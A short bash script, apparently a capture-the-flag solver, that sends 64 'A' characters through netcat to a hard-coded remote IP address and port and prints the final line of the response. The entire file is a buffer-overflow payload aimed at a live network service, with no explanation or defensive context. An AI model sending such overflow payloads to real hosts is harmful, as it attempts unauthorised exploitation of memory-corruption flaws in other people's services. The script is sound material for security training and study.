#! /bin/bash

python -c 'print "A"*64' | nc 40.76.33.15 12345 | tail -n 1  
